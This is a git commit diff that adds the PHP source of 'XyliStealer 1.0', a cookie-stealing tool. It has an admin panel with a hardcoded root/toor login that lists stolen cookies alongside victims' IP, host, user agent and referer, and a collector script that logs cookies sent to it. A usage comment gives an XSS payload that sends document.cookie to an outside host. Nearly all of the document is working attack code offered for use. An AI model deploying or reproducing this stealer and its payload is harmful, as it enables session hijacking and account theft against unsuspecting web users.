d48efed1bc8c579dfceca5bfe0462f22c6915025
Xylitol <xylitol@temari.fr>
2015-02-08 23:08:45 +0100

    1.0
    1.0

---
+++ admin.php
@@ -0,0 +1,95 @@
+<?php /*
+__   __      _ _ _____ _             _             __   _____ 
+\ \ / /     | (_)  ___| |           | |           /  | |  _  |
+ \ V / _   _| |_\ `--.| |_ ___  __ _| | ___ _ __  `| | | |/' |
+ /   \| | | | | |`--. \ __/ _ \/ _` | |/ _ \ '__|  | | |  /| |
+/ /^\ \ |_| | | /\__/ / ||  __/ (_| | |  __/ |    _| |_\ |_/ /
+\/   \/\__, |_|_\____/ \__\___|\__,_|_|\___|_|    \___(_)___/ 
+        __/ |
+       |___/     By Xylitol  
+*/ ?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<meta http-equiv="Content-Style-Type" CONTENT="text/css">
+<meta name="robots" content="index, follow, all" />
+<meta name="description" content="XyliStealer 1.0" />
+<meta name="keywords" content="XyliStealer 1.0" />
+<meta name="author" CONTENT="Xylitol">
+<title>XyliStealer 1.0</title>
+<style type="text/css">
+<!--
+body,td,th {
+	color: #FF0033;
+}
+body {
+	background-color: #000000;
+}
+.Style1 {
+	color: #00CC33;
+	font-weight: bold;
+}
+-->
+</style></head>
+<body>
+<table width="535" border="1" align="center">
+  <tr>
+    <td width="525"><div align="center"><span class="Style1">XyliStealer 1.0 - By Xylitol</span></div></td>
+  </tr>
+</table>
+<p>&nbsp;</p>
+<p><?php
+$LOGIN="root";  //login
+$PASSWD="toor";   //password
+if ($_POST['logintext']==$LOGIN && $_POST['passwdtext']==$PASSWD) {  ?>
+<html>
+<body>
+<p><br />
+Cookies:</p>
+<table width="726" border="1">
+<tr><td>IP:</td><td>Host:</td><td>User-Agent:</td><td>Date:</td><td>Time:</td><td>Referer:</td><td>Cookie:</td></tr>
+<!-- Breakpoint -->
+</table>
+<p>&nbsp;</p>
+<table width="535" border="1" align="center">
+  <tr>
+    <td width="525"><div align="center"><span class="Style1">Blah !</span></div></td>
+  </tr>
+</table>
+</body>
+</html>
+
+<?php } else { ?>
+<html>
+<body>
+<p>Log in to continue</p>
+<form name="connexion" action="Stealed.php" method="post">
+  <table width="298" border="1">
+<tr>
+        <td width="102">Login :</td>
+      <td width="180"><input name="logintext" type="text" size="30" maxlength="30" /></td>
+      </tr>
+      <tr>
+        <td>Password :</td>
+        <td><input name="passwdtext" type="text" size="30" maxlength="30" /></td>
+      </tr>
+    </table>
+  <table width="298" border="0">
+    <tr>
+      <td><div align="center">
+        <input name="envoi" type="submit" value="-= Connect =-" />
+      </div></td>
+    </tr>
+  </table>
+  </form>
+  <p>&nbsp;</p>
+<table width="535" border="1" align="center">
+  <tr>
+    <td width="525"><div align="center"><span class="Style1">Blah !</span></div></td>
+  </tr>
+</table>
+</body>
+</html>
+<?php } ?>
+
---
+++ c.php
@@ -0,0 +1,51 @@
+<?php /*
+__   __      _ _ _____ _             _             __   _____ 
+\ \ / /     | (_)  ___| |           | |           /  | |  _  |
+ \ V / _   _| |_\ `--.| |_ ___  __ _| | ___ _ __  `| | | |/' |
+ /   \| | | | | |`--. \ __/ _ \/ _` | |/ _ \ '__|  | | |  /| |
+/ /^\ \ |_| | | /\__/ / ||  __/ (_| | |  __/ |    _| |_\ |_/ /
+\/   \/\__, |_|_\____/ \__\___|\__,_|_|\___|_|    \___(_)___/ 
+        __/ |
+       |___/     By Xylitol  
+*/
+
+/*
+Usage:
+<script>location.href='http://xxxxxx.fr/c.php?c='+escape(document.cookie)</script> 
+*/
+	//fucktion pour add les infos :
+	function addToStealed($file, $ip, $host, $navigator, $date, $heure, $provenance, $data)
+	{
+		$tmp		= file($file);
+		$newPage	= '';
+		while($ligneActuelle = array_shift($tmp))
+		{
+			//if(preg_match("#<!-- Breakpoint -->#",$ligneActuelle)) //si on rencontre le breakpoint
+			if($ligneActuelle == "<!-- Breakpoint -->\n") //si on rencontre le breakpoint
+			{
+				$newPage .= "<tr><td>$ip</td><td>$host</td><td>$navigator</td><td>$date</td><td>$heure</td><td>$provenance</td><td>$data</td></tr>";
+				$newPage .= "\n<!-- Breakpoint -->\n";
+			}
+			else
+				$newPage .= $ligneActuelle;
+		}
+		
+		$monfichier = fopen($file, 'w');
+		fseek($monfichier, 0);
+		fputs($monfichier, $newPage);
+	 
+		fclose($monfichier);
+	}
+	
+	$ip			= $_SERVER['REMOTE_ADDR'];
+	$host		= gethostbyaddr($ip);
+	$navigator	= $_SERVER['HTTP_USER_AGENT'];
+	$date		= date("d/m/Y");
+	$heure		= date("H:i:s");
+	$provenance	= (!empty($_SERVER['HTTP_REFERER'])) ? $_SERVER['HTTP_REFERER'] : 'Unspecified';
+	if(isset($_GET['c']))	$data	= $_GET['c'];
+	else 					$data	= 'No data';
+	
+	addToStealed("Stealed.php", $ip, $host, $navigator, $date, $heure, $provenance, $data);
+	echo "Unauthorized Access";
+?>
